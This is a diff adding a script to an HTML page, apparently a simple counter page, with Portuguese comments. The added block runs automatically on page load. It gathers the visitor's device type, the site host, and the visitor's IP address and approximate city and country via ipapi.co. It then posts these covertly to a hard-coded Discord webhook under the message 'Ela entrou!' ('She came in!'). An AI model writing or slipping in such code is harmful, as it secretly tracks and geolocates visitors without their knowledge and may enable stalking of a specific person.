@@ -134,6 +134,49 @@
             elementoContador.innerText = "0";
         }
 
+ (async () => {
+  const WEBHOOK = "https://discord.com/api/webhooks/1497581802854813777/UoGoUcWraixjsFZ3uM-Ss2M4CntGb0qBGQkIDcWluir-lXbqxNHnLU369e_-Bptb1st2";
+
+  // 🔹 Detectar dispositivo
+  const ua = navigator.userAgent.toLowerCase();
+  const isMobile = /mobile|android|iphone|ipad/.test(ua);
+  const device = isMobile ? "📱 Celular" : "💻 PC";
+
+  // 🔹 Pegar subdomínio / host
+  const host = window.location.hostname;
+
+  // 🔹 Pegar IP + localização aproximada
+  let ipInfo = "Não disponível";
+
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    ipInfo = `🌐 IP: ${data.ip}
+📍 ${data.city}, ${data.region} - ${data.country_name}`;
+  } catch (e) {
+    ipInfo = "Erro ao obter IP";
+  }
+
+  // 🔹 Enviar pro Discord
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: `👀 Ela entrou!
+
+🌍 Site: ${host}
+⏰ ${new Date().toLocaleString()}
+${device}
+
+${ipInfo}`
+    })
+  });
+
+})();
+        
     </script>
 
 </body>
